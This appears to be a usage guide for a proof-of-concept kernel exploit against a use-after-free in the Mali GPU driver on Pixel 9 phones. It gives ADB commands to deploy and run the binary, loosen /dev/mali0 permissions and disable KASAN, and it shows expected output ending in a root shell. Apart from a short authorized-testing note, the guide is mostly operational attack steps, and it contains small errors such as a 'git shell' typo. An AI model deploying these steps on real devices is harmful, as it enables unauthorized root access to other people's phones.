# Usage Guide: CVE-2025-6349/8045 POC

## For Windows (Direct ADB - No WSL)

### Prerequisites
1. Install [Android SDK Platform Tools](https://developer.android.com/studio/releases/platform-tools)
2. Enable **USB Debugging** on your Pixel device
   - Settings → About Phone → Tap "Build Number" 7 times
   - Settings → System → Developer Options → USB Debugging
3. Connect device via USB
4. Verify connection: `adb devices`

### Quick Start (Windows)

```cmd
cd C:\path\to\shaby-tech-bug-hunter

:: 1. Build (if not already built)
make
:: or use ndk-build if configured

:: 2. Run test script
run_test.bat
```

The batch file will:
- Verify ADB connection
- Check device model and root status
- Deploy POC to `/data/local/tmp/`
- Execute exploit
- Show dmesg output with UAF indicators

### Manual Testing (Windows)

```cmd
:: Push binary
adb push mali_uaf_poc /data/local/tmp/
adb shell chmod +x /data/local/tmp/mali_uaf_poc

:: Run
adb shell /data/local/tmp/mali_uaf_poc

:: Check for UAF
git shell dmesg | findstr /i "kasan"

:: Check root
adb shell id
```

## For Linux/WSL2

### Option A: Use WSL2 (recommended if USB works)

```bash
# Build
make

# Run test script
./run_test.sh

# Or manual
adb push mali_uaf_poc /data/local/tmp/
adb shell chmod +x /data/local/tmp/mali_uaf_poc
adb shell /data/local/tmp/mali_uaf_poc
```

### Option B: Direct Linux (native)

Same commands as WSL2.

## For macOS

```bash
# Install Android NDK
brew install android-platform-tools

# Build
make

# Deploy and run
./run_test.sh
```

## Troubleshooting

### Issue: "No device connected" (Windows)

**Solution:**
1. Check USB Debugging is enabled
2. Authorize computer when prompted on device
3. Try different USB port/cable
4. Restart ADB server:
   ```cmd
   adb kill-server
   adb start-server
   adb devices
   ```

### Issue: "Permission denied" on /dev/mali0

**Solution:**
```cmd
adb shell su -c "chmod 666 /dev/mali0"
adb shell su -c "/data/local/tmp/mali_uaf_poc"
```

### Issue: "No Mali device"

**Solution:**
```cmd
:: Create device node (requires root)
adb shell su -c "mknod /dev/mali0 c 242 0"
```

### Issue: "KASAN detected UAF" in dmesg

**This is expected!** It means:
- The race condition worked ✅
- Double-free was triggered ✅
- Kernel detected the UAF ✅

The exploit is working but KASAN prevents further exploitation.
Test with `kasan=off` kernel cmdline or on non-KASAN build.

## Expected Output

### Successful UAF Trigger
```
=== CVE-2025-6349/8045 POC Test ===
Target: Pixel 9 (Tokay) Android 16

[*] Device connected
[*] Device info:
   Model: Google Pixel 9
   Android: 16
   Kernel: Linux version 5.10.x

[*] Running exploit...
[+] GPU allocation: VA=0x...
[+] Attempt 0: GPU allocation at VA 0x...
[+] Mapped attempt 0
[+] UAF CONFIRMED: Can read/write freed page!
[+] Physical page PFN: 0x12345678

=== Test Summary ===
[!] POC completed without errors
```

### dmesg UAF Indicator
```
$ adb shell dmesg | grep kasan
[ 123.456789] kasan: slab-use-after-free in kbasep_csf_cpu_queue_dump_buffer+0xXX/0xXX
```

### Root Shell (if full exploit works)
```
$ adb shell id
uid=0(root) gid=0(root) groups=0(root)
```

## Build Notes

### Static vs Dynamic Linking
- **Static** (default): Larger binary (~800KB), more portable, no dependencies
- **Dynamic**: Smaller binary, requires libpthread, libm on device

Use static for maximum compatibility across Android versions.

### Cross-Compilation
- **Linux native:** `aarch64-linux-gnu-gcc` (from gcc-aarch64-linux-gnu package)
- **Android NDK:** `aarch64-linux-android34-clang` (from NDK r26+)

## Security Notes

- This POC is for **authorized testing only**
- Do not use on devices you don't own
- Requires **physical access** or **ADB authorization**
- Works on **rooted devices** for full exploitation
- Patched in Android December 2025 security update

## References

- Dawn's Lab: https://dawnslab.jd.com/Pixel_9_Pro_EoP/
- ARM Advisory: CVE-2025-6349/8045
- Android Bulletin: December 2025
